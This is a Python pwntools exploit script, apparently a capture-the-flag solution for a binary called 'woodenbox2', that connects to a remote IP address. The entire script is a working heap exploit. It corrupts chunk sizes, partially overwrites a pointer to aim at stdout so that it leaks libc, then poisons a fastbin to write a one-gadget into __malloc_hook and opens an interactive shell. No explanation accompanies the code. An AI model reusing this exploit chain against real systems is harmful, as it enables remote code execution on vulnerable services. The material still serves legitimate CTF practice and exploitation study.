from pwn import *
context.log_level = 'debug'
prog = './woodenbox2'
elf = ELF(prog)
#p = process(prog)

libc = ELF("./libc6_2.23-0ubuntu11_amd64.so")
p = remote("121.36.215.224", 9998)
def debug(addr,PIE=True): 
	if PIE: 
		text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16) 
		gdb.attach(p,'b *{}'.format(hex(text_base+addr))) 
	else: gdb.attach(p,"b *{}".format(hex(addr)))
def dbg(b= ''):
    gdb.attach(p, b)
    if b == '':
    	p.interactive()
    	
def add(size, content='a'):
	p.sendlineafter("choice:", '1')
	p.sendlineafter("item name:", str(size))
	p.sendafter("name of item:", content)
def edit(idx, size, content):
	p.sendlineafter("choice:", '2')
	p.sendlineafter("index of item:", str(idx))
	p.sendlineafter("item name:", str(size))
	p.sendafter("name of the item:", content)
def free(idx):
	p.sendlineafter("choice:", '3')
	p.sendlineafter("index of item:", str(idx))
def exp():
	add(0x10)#0
	add(0x10)#1
	add(0x80)#2
	add(0x60)#3
	add(0x10)#4
	free(3)
	edit(0, 0x20, 'a'*0x10+p64(0)+p64(0x101))
	free(1)
	add(0x80)
	edit(0, 0xa0, 'a'*0x80+p64(0)+p64(0x71)+'\xdd\x25')
	add(0x60)
	add(0x60)
	edit(3, 0x70, '\x00'*(0x30+3) + p64(0xfbad1800)+p64(0)*3+'\x00')
	p.recv(0x40)
	libc.address = u64(p.recv(6)+'\x00'*2)-0x7ffff7dd2600+0x7ffff7a0d000
	log.info("libc.address ==> " + hex(libc.address))
	add(0x60)
	free(4)
	edit(0, 0x60, p64(libc.sym['__malloc_hook']-0x23))
	add(0x60)
	add(0x60, '\x00'*0x13+p64(libc.address+0xf02a4))
	#dbg()
	p.interactive()
if __name__ == '__main__':
	exp()
